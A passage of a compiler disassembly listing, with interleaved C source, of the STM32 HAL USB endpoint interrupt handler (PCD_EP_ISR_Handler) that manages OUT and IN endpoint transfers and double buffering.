 800281c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002820:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002824:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002828:	b29b      	uxth	r3, r3
 800282a:	8013      	strh	r3, [r2, #0]
 800282c:	e22c      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 800282e:	687b      	ldr	r3, [r7, #4]
 8002830:	681b      	ldr	r3, [r3, #0]
 8002832:	461a      	mov	r2, r3
 8002834:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002838:	009b      	lsls	r3, r3, #2
 800283a:	4413      	add	r3, r2
 800283c:	881b      	ldrh	r3, [r3, #0]
 800283e:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002842:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002846:	2b00      	cmp	r3, #0
 8002848:	f280 80f6 	bge.w	8002a38 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 800284c:	687b      	ldr	r3, [r7, #4]
 800284e:	681b      	ldr	r3, [r3, #0]
 8002850:	461a      	mov	r2, r3
 8002852:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002856:	009b      	lsls	r3, r3, #2
 8002858:	4413      	add	r3, r2
 800285a:	881b      	ldrh	r3, [r3, #0]
 800285c:	b29a      	uxth	r2, r3
 800285e:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002862:	4013      	ands	r3, r2
 8002864:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002868:	687b      	ldr	r3, [r7, #4]
 800286a:	681b      	ldr	r3, [r3, #0]
 800286c:	461a      	mov	r2, r3
 800286e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002872:	009b      	lsls	r3, r3, #2
 8002874:	4413      	add	r3, r2
 8002876:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 800287a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800287e:	b292      	uxth	r2, r2
 8002880:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 8002882:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002886:	4613      	mov	r3, r2
 8002888:	009b      	lsls	r3, r3, #2
 800288a:	4413      	add	r3, r2
 800288c:	00db      	lsls	r3, r3, #3
 800288e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002892:	687a      	ldr	r2, [r7, #4]
 8002894:	4413      	add	r3, r2
 8002896:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002898:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800289a:	7b1b      	ldrb	r3, [r3, #12]
 800289c:	2b00      	cmp	r3, #0
 800289e:	d123      	bne.n	80028e8 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028a0:	687b      	ldr	r3, [r7, #4]
 80028a2:	681b      	ldr	r3, [r3, #0]
 80028a4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028a8:	b29b      	uxth	r3, r3
 80028aa:	461a      	mov	r2, r3
 80028ac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ae:	781b      	ldrb	r3, [r3, #0]
 80028b0:	00db      	lsls	r3, r3, #3
 80028b2:	4413      	add	r3, r2
 80028b4:	687a      	ldr	r2, [r7, #4]
 80028b6:	6812      	ldr	r2, [r2, #0]
 80028b8:	4413      	add	r3, r2
 80028ba:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028be:	881b      	ldrh	r3, [r3, #0]
 80028c0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80028c4:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 80028c8:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028cc:	2b00      	cmp	r3, #0
 80028ce:	f000 808e 	beq.w	80029ee <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 80028d2:	687b      	ldr	r3, [r7, #4]
 80028d4:	6818      	ldr	r0, [r3, #0]
 80028d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d8:	6959      	ldr	r1, [r3, #20]
 80028da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028dc:	88da      	ldrh	r2, [r3, #6]
 80028de:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028e2:	f005 fdda 	bl	800849a <USB_ReadPMA>
 80028e6:	e082      	b.n	80029ee <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 80028e8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ea:	78db      	ldrb	r3, [r3, #3]
 80028ec:	2b02      	cmp	r3, #2
 80028ee:	d10a      	bne.n	8002906 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 80028f0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80028f4:	461a      	mov	r2, r3
 80028f6:	6d79      	ldr	r1, [r7, #84]	; 0x54
 80028f8:	6878      	ldr	r0, [r7, #4]
 80028fa:	f000 f9d3 	bl	8002ca4 <HAL_PCD_EP_DB_Receive>
 80028fe:	4603      	mov	r3, r0
 8002900:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002904:	e073      	b.n	80029ee <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002906:	687b      	ldr	r3, [r7, #4]
 8002908:	681b      	ldr	r3, [r3, #0]
 800290a:	461a      	mov	r2, r3
 800290c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800290e:	781b      	ldrb	r3, [r3, #0]
 8002910:	009b      	lsls	r3, r3, #2
 8002912:	4413      	add	r3, r2
 8002914:	881b      	ldrh	r3, [r3, #0]
 8002916:	b29b      	uxth	r3, r3
 8002918:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800291c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002920:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002924:	687b      	ldr	r3, [r7, #4]
 8002926:	681b      	ldr	r3, [r3, #0]
 8002928:	461a      	mov	r2, r3
 800292a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800292c:	781b      	ldrb	r3, [r3, #0]
 800292e:	009b      	lsls	r3, r3, #2
 8002930:	441a      	add	r2, r3
 8002932:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002936:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800293a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800293e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002942:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002946:	b29b      	uxth	r3, r3
 8002948:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 800294a:	687b      	ldr	r3, [r7, #4]
 800294c:	681b      	ldr	r3, [r3, #0]
 800294e:	461a      	mov	r2, r3
 8002950:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002952:	781b      	ldrb	r3, [r3, #0]
 8002954:	009b      	lsls	r3, r3, #2
 8002956:	4413      	add	r3, r2
 8002958:	881b      	ldrh	r3, [r3, #0]
 800295a:	b29b      	uxth	r3, r3
 800295c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002960:	2b00      	cmp	r3, #0
 8002962:	d022      	beq.n	80029aa <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002964:	687b      	ldr	r3, [r7, #4]
 8002966:	681b      	ldr	r3, [r3, #0]
 8002968:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800296c:	b29b      	uxth	r3, r3
 800296e:	461a      	mov	r2, r3
 8002970:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002972:	781b      	ldrb	r3, [r3, #0]
 8002974:	00db      	lsls	r3, r3, #3
 8002976:	4413      	add	r3, r2
 8002978:	687a      	ldr	r2, [r7, #4]
 800297a:	6812      	ldr	r2, [r2, #0]
 800297c:	4413      	add	r3, r2
 800297e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002982:	881b      	ldrh	r3, [r3, #0]
 8002984:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002988:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 800298c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002990:	2b00      	cmp	r3, #0
 8002992:	d02c      	beq.n	80029ee <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002994:	687b      	ldr	r3, [r7, #4]
 8002996:	6818      	ldr	r0, [r3, #0]
 8002998:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299a:	6959      	ldr	r1, [r3, #20]
 800299c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800299e:	891a      	ldrh	r2, [r3, #8]
 80029a0:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029a4:	f005 fd79 	bl	800849a <USB_ReadPMA>
 80029a8:	e021      	b.n	80029ee <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80029aa:	687b      	ldr	r3, [r7, #4]
 80029ac:	681b      	ldr	r3, [r3, #0]
 80029ae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029b2:	b29b      	uxth	r3, r3
 80029b4:	461a      	mov	r2, r3
 80029b6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029b8:	781b      	ldrb	r3, [r3, #0]
 80029ba:	00db      	lsls	r3, r3, #3
 80029bc:	4413      	add	r3, r2
 80029be:	687a      	ldr	r2, [r7, #4]
 80029c0:	6812      	ldr	r2, [r2, #0]
 80029c2:	4413      	add	r3, r2
 80029c4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80029c8:	881b      	ldrh	r3, [r3, #0]
 80029ca:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029ce:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029d2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029d6:	2b00      	cmp	r3, #0
 80029d8:	d009      	beq.n	80029ee <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 80029da:	687b      	ldr	r3, [r7, #4]
 80029dc:	6818      	ldr	r0, [r3, #0]
 80029de:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029e0:	6959      	ldr	r1, [r3, #20]
 80029e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029e4:	895a      	ldrh	r2, [r3, #10]
 80029e6:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029ea:	f005 fd56 	bl	800849a <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 80029ee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029f0:	69da      	ldr	r2, [r3, #28]
 80029f2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029f6:	441a      	add	r2, r3
 80029f8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029fa:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 80029fc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029fe:	695a      	ldr	r2, [r3, #20]
 8002a00:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a04:	441a      	add	r2, r3
 8002a06:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a08:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a0a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a0c:	699b      	ldr	r3, [r3, #24]
 8002a0e:	2b00      	cmp	r3, #0
 8002a10:	d005      	beq.n	8002a1e <PCD_EP_ISR_Handler+0x504>
 8002a12:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002a16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a18:	691b      	ldr	r3, [r3, #16]
 8002a1a:	429a      	cmp	r2, r3
 8002a1c:	d206      	bcs.n	8002a2c <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002a1e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a20:	781b      	ldrb	r3, [r3, #0]
 8002a22:	4619      	mov	r1, r3
 8002a24:	6878      	ldr	r0, [r7, #4]
 8002a26:	f009 ff3d 	bl	800c8a4 <HAL_PCD_DataOutStageCallback>
 8002a2a:	e005      	b.n	8002a38 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002a2c:	687b      	ldr	r3, [r7, #4]
 8002a2e:	681b      	ldr	r3, [r3, #0]
 8002a30:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002a32:	4618      	mov	r0, r3
 8002a34:	f003 ffe3 	bl	80069fe <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002a38:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002a3c:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002a40:	2b00      	cmp	r3, #0
 8002a42:	f000 8121 	beq.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002a46:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a4a:	1c5a      	adds	r2, r3, #1
 8002a4c:	4613      	mov	r3, r2
 8002a4e:	009b      	lsls	r3, r3, #2
 8002a50:	4413      	add	r3, r2
 8002a52:	00db      	lsls	r3, r3, #3
 8002a54:	687a      	ldr	r2, [r7, #4]
 8002a56:	4413      	add	r3, r2
 8002a58:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002a5a:	687b      	ldr	r3, [r7, #4]
 8002a5c:	681b      	ldr	r3, [r3, #0]
 8002a5e:	461a      	mov	r2, r3
 8002a60:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a64:	009b      	lsls	r3, r3, #2
 8002a66:	4413      	add	r3, r2
 8002a68:	881b      	ldrh	r3, [r3, #0]
 8002a6a:	b29b      	uxth	r3, r3
 8002a6c:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002a70:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002a74:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002a78:	687b      	ldr	r3, [r7, #4]
 8002a7a:	681b      	ldr	r3, [r3, #0]
 8002a7c:	461a      	mov	r2, r3
 8002a7e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a82:	009b      	lsls	r3, r3, #2
 8002a84:	441a      	add	r2, r3
 8002a86:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002a8a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a8e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a92:	b29b      	uxth	r3, r3
 8002a94:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002a96:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a98:	78db      	ldrb	r3, [r3, #3]
 8002a9a:	2b01      	cmp	r3, #1
 8002a9c:	f040 80a2 	bne.w	8002be4 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002aa0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa2:	2200      	movs	r2, #0
 8002aa4:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002aa6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa8:	7b1b      	ldrb	r3, [r3, #12]
 8002aaa:	2b00      	cmp	r3, #0
 8002aac:	f000 8093 	beq.w	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ab0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ab4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ab8:	2b00      	cmp	r3, #0
 8002aba:	d046      	beq.n	8002b4a <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002abc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002abe:	785b      	ldrb	r3, [r3, #1]
 8002ac0:	2b00      	cmp	r3, #0
 8002ac2:	d126      	bne.n	8002b12 <PCD_EP_ISR_Handler+0x5f8>
 8002ac4:	687b      	ldr	r3, [r7, #4]
 8002ac6:	681b      	ldr	r3, [r3, #0]
 8002ac8:	627b      	str	r3, [r7, #36]	; 0x24
 8002aca:	687b      	ldr	r3, [r7, #4]
 8002acc:	681b      	ldr	r3, [r3, #0]
 8002ace:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ad2:	b29b      	uxth	r3, r3
 8002ad4:	461a      	mov	r2, r3
 8002ad6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002ad8:	4413      	add	r3, r2
 8002ada:	627b      	str	r3, [r7, #36]	; 0x24
 8002adc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ade:	781b      	ldrb	r3, [r3, #0]
 8002ae0:	00da      	lsls	r2, r3, #3
 8002ae2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002ae4:	4413      	add	r3, r2
 8002ae6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002aea:	623b      	str	r3, [r7, #32]
 8002aec:	6a3b      	ldr	r3, [r7, #32]
 8002aee:	881b      	ldrh	r3, [r3, #0]
 8002af0:	b29b      	uxth	r3, r3
 8002af2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002af6:	b29a      	uxth	r2, r3
 8002af8:	6a3b      	ldr	r3, [r7, #32]
 8002afa:	801a      	strh	r2, [r3, #0]
 8002afc:	6a3b      	ldr	r3, [r7, #32]
 8002afe:	881b      	ldrh	r3, [r3, #0]
 8002b00:	b29b      	uxth	r3, r3
 8002b02:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b06:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b0a:	b29a      	uxth	r2, r3
 8002b0c:	6a3b      	ldr	r3, [r7, #32]
 8002b0e:	801a      	strh	r2, [r3, #0]
 8002b10:	e061      	b.n	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
 8002b12:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b14:	785b      	ldrb	r3, [r3, #1]
 8002b16:	2b01      	cmp	r3, #1
 8002b18:	d15d      	bne.n	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
 8002b1a:	687b      	ldr	r3, [r7, #4]
 8002b1c:	681b      	ldr	r3, [r3, #0]
 8002b1e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b20:	687b      	ldr	r3, [r7, #4]
 8002b22:	681b      	ldr	r3, [r3, #0]
 8002b24:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b28:	b29b      	uxth	r3, r3
 8002b2a:	461a      	mov	r2, r3
 8002b2c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b2e:	4413      	add	r3, r2
 8002b30:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b34:	781b      	ldrb	r3, [r3, #0]
 8002b36:	00da      	lsls	r2, r3, #3
 8002b38:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b3a:	4413      	add	r3, r2
 8002b3c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b40:	62bb      	str	r3, [r7, #40]	; 0x28
 8002b42:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002b44:	2200      	movs	r2, #0
 8002b46:	801a      	strh	r2, [r3, #0]
 8002b48:	e045      	b.n	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b4a:	687b      	ldr	r3, [r7, #4]
 8002b4c:	681b      	ldr	r3, [r3, #0]
 8002b4e:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002b50:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b52:	785b      	ldrb	r3, [r3, #1]
 8002b54:	2b00      	cmp	r3, #0
 8002b56:	d126      	bne.n	8002ba6 <PCD_EP_ISR_Handler+0x68c>
 8002b58:	687b      	ldr	r3, [r7, #4]
 8002b5a:	681b      	ldr	r3, [r3, #0]
 8002b5c:	637b      	str	r3, [r7, #52]	; 0x34
 8002b5e:	687b      	ldr	r3, [r7, #4]
 8002b60:	681b      	ldr	r3, [r3, #0]
 8002b62:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b66:	b29b      	uxth	r3, r3
 8002b68:	461a      	mov	r2, r3
 8002b6a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b6c:	4413      	add	r3, r2
 8002b6e:	637b      	str	r3, [r7, #52]	; 0x34
 8002b70:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b72:	781b      	ldrb	r3, [r3, #0]
 8002b74:	00da      	lsls	r2, r3, #3
 8002b76:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b78:	4413      	add	r3, r2
 8002b7a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002b7e:	633b      	str	r3, [r7, #48]	; 0x30
 8002b80:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b82:	881b      	ldrh	r3, [r3, #0]
 8002b84:	b29b      	uxth	r3, r3
 8002b86:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b8a:	b29a      	uxth	r2, r3
 8002b8c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b8e:	801a      	strh	r2, [r3, #0]
 8002b90:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b92:	881b      	ldrh	r3, [r3, #0]
 8002b94:	b29b      	uxth	r3, r3
 8002b96:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b9a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b9e:	b29a      	uxth	r2, r3
 8002ba0:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002ba2:	801a      	strh	r2, [r3, #0]
 8002ba4:	e017      	b.n	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
 8002ba6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba8:	785b      	ldrb	r3, [r3, #1]
 8002baa:	2b01      	cmp	r3, #1
 8002bac:	d113      	bne.n	8002bd6 <PCD_EP_ISR_Handler+0x6bc>
 8002bae:	687b      	ldr	r3, [r7, #4]
 8002bb0:	681b      	ldr	r3, [r3, #0]
 8002bb2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bb6:	b29b      	uxth	r3, r3
 8002bb8:	461a      	mov	r2, r3
 8002bba:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bbc:	4413      	add	r3, r2
 8002bbe:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002bc0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bc2:	781b      	ldrb	r3, [r3, #0]
 8002bc4:	00da      	lsls	r2, r3, #3
 8002bc6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bc8:	4413      	add	r3, r2
 8002bca:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bce:	63bb      	str	r3, [r7, #56]	; 0x38
 8002bd0:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002bd2:	2200      	movs	r2, #0
 8002bd4:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002bd6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bd8:	781b      	ldrb	r3, [r3, #0]
 8002bda:	4619      	mov	r1, r3
 8002bdc:	6878      	ldr	r0, [r7, #4]
 8002bde:	f009 fe7c 	bl	800c8da <HAL_PCD_DataInStageCallback>
 8002be2:	e051      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002be4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002be8:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002bec:	2b00      	cmp	r3, #0
 8002bee:	d144      	bne.n	8002c7a <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002bf0:	687b      	ldr	r3, [r7, #4]
 8002bf2:	681b      	ldr	r3, [r3, #0]
 8002bf4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bf8:	b29b      	uxth	r3, r3
 8002bfa:	461a      	mov	r2, r3
 8002bfc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bfe:	781b      	ldrb	r3, [r3, #0]
 8002c00:	00db      	lsls	r3, r3, #3
 8002c02:	4413      	add	r3, r2
 8002c04:	687a      	ldr	r2, [r7, #4]
 8002c06:	6812      	ldr	r2, [r2, #0]
 8002c08:	4413      	add	r3, r2
 8002c0a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c0e:	881b      	ldrh	r3, [r3, #0]
 8002c10:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c14:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002c18:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c1a:	699a      	ldr	r2, [r3, #24]
 8002c1c:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c20:	429a      	cmp	r2, r3
 8002c22:	d907      	bls.n	8002c34 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002c24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c26:	699a      	ldr	r2, [r3, #24]
 8002c28:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c2c:	1ad2      	subs	r2, r2, r3
 8002c2e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c30:	619a      	str	r2, [r3, #24]
 8002c32:	e002      	b.n	8002c3a <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002c34:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c36:	2200      	movs	r2, #0
 8002c38:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002c3a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c3c:	699b      	ldr	r3, [r3, #24]
 8002c3e:	2b00      	cmp	r3, #0
 8002c40:	d106      	bne.n	8002c50 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c42:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c44:	781b      	ldrb	r3, [r3, #0]
 8002c46:	4619      	mov	r1, r3
 8002c48:	6878      	ldr	r0, [r7, #4]
 8002c4a:	f009 fe46 	bl	800c8da <HAL_PCD_DataInStageCallback>
 8002c4e:	e01b      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
